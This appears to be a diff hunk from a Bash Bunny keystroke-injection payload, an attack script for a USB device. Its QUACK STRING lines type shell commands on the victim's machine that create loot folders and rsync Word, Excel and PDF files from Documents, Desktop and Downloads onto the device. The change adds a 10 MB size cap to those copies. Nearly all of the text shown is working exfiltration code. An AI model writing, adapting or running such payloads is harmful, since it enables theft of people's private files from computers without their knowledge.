@@ -35,19 +35,21 @@ QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Desktop;
 QUACK ENTER
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Downloads;
 QUACK ENTER
-QUACK STRING rsync -av Documents/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Documents ;
+
+# We can change the max-size of the documents
+QUACK STRING rsync -av --max-size=10M Documents/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Documents ;
 QUACK ENTER
 QUACK STRING echo "Please wait while the files are copied...";
 QUACK ENTER
 QUACK STRING wait;
 QUACK ENTER
-QUACK STRING rsync -av Desktop/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Desktop ;
+QUACK STRING rsync -av --max-size=10M Desktop/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Desktop ;
 QUACK ENTER
 QUACK STRING echo "Please wait while the files are copied...";
 QUACK ENTER
 QUACK STRING wait;
 QUACK ENTER
-QUACK STRING rsync -av Downloads/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Downloads ;
+QUACK STRING rsync -av --max-size=10M Downloads/**/*.{docx,xlsx,pdf} /Volumes/BashBunny/$lootdir/Downloads ;
 QUACK ENTER
 QUACK STRING echo "Please wait while the files are copied...";
 QUACK ENTER
